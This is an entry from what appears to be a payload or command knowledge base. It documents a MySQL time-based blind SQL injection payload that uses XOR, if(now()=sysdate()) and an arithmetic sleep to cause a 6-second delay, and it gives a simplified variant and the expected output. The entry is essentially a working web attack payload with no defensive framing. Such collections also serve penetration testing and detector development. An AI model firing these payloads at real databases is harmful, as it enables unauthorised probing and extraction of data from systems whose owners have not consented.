---
id: cmd-sql-6s
data: 'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
tags:
  - sqli
  - payload
  - sleep
type: command
output: Server delay of 6 seconds
executor: sql
platforms:
  - MySQL
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.330Z'
verified: false
validated: true
submitted: true
---
# sql-payload-6s-sleep

## Command

```sql
XOR(if(now()=sysdate(),sleep(6*6-30),0))OR
```

## Description

Payload with subtraction for 6-second delay in blind SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sleep(6*6-30)` | 36-30=6 second sleep | Yes |

## Examples

### Basic Usage

```sql
XOR(if(true,sleep(6),0))OR
```

## Expected Output

6-second delay on execution.

## Related

- [[commands/sql-payload-25s-sleep]]
